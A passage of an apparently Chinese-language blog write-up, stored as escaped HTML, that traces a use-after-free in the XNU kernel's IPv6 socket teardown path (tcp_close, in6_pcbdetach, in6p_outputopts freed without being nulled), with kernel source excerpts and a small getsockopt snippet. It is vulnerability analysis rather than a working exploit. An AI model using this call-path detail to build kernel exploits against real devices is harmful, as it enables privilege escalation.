		&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 9&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SO_LINGER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_linger&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_drop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;soisdisconnecting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sbflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_rcv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_usrclosed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#if MPTCP
&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* A reset has been sent but socket exists, do not send FIN */&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_MP_SUBFLOW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
		    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_mpflags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TMPF_RESET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;想要在用户态进行状态判断可以参照如下代码&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// https://developer.apple.com/documentation/kernel/tcp_connection_info&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_connection_info&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;getsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP_CONNECTION_INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;NSLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpi_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_close()&lt;/code&gt;实在是太长了，这里去掉了部分业务逻辑代码，反正肯定会执行到下面的，此处会判断协议族，本次漏洞发生在位置10的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in6_pcbdetach()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;tcp_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_inpcb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#if INET6
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_CHECK_DOM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;in6_pcbdetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 10&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* INET6 */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;in_pcbdetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * Call soisdisconnected after detach because it might unlock the socket
	 */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;soisdisconnected&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tcpstat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcps_closed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;KERNEL_DEBUG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBG_FNC_TCP_CLOSE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DBG_FUNC_END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;tcpstat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcps_closed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in6_pcbdetach()&lt;/code&gt;的位置11调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_freepcbopts()&lt;/code&gt;释放结构体成员&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;，从上下文可以看出来，这里只进行了释放操作，并没有将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;，符合UAF的漏洞模型&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;in6_pcbdetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inpcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_pcb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* PCB has been disposed */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s: inp=%p so=%p proto=%d so_pcb is null!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__func__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_PROTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* NOTREACHED */&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#if IPSEC
&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_sp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipsec6_delete_pcbpolicy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#endif &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* IPSEC */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_stat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_PROTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_UDP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_stat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rxpackets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_stat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txpackets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;INC_ATOMIC_INT64_LIM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net_api_stats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nas_socket_inet6_dgram_no_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * Let NetworkStatistics know this PCB is going away
	 * before we detach it.
	 */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nstat_collect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
	    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_PROTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_PROTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_UDP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;nstat_pcb_detach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* mark socket state as dead */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_pcb_checkstate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WNT_STOPUSING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WNT_STOPUSING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s: so=%p proto=%d couldn't set to STOPUSING&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;__func__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_PROTO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* NOTREACHED */&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_PCBCLEARING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_moptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
